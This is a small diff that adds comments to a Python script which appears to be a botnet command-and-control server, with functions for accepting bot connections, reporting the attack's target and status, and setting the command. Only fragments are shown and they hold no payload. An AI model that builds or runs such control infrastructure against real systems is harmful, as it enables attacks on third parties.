@@ -16,6 +16,7 @@ command = ""
 stop_event = threading.Event() 
 
 
+# function to accept incoming connections from botnets
 def acceptor(s: socket.socket):
 
     global active_connections
@@ -93,6 +94,7 @@ def handle_client(conn: socket.socket, addr):
         del conn_dict[conn_name]
 
 
+# function to get the current details and status of the attack for the webserver
 def getAttackDetails():
     conn_list = []
     is_attacking = False
@@ -108,6 +110,7 @@ def getAttackDetails():
     return {"target": target, "num_conns": active_connections, "conns": conn_list, "state": state}
 
 
+# function to set the command to whatever is given to the webserver
 def setCommand(cmd: str):
     global command
     global target
@@ -118,6 +121,7 @@ def setCommand(cmd: str):
     return ret_msg
 
 
+# main function
 def main():
     global target
     global command
@@ -160,6 +164,6 @@ def main():
         print("")
         exit()       
 
-        
+
 if __name__ == "__main__":
     main()
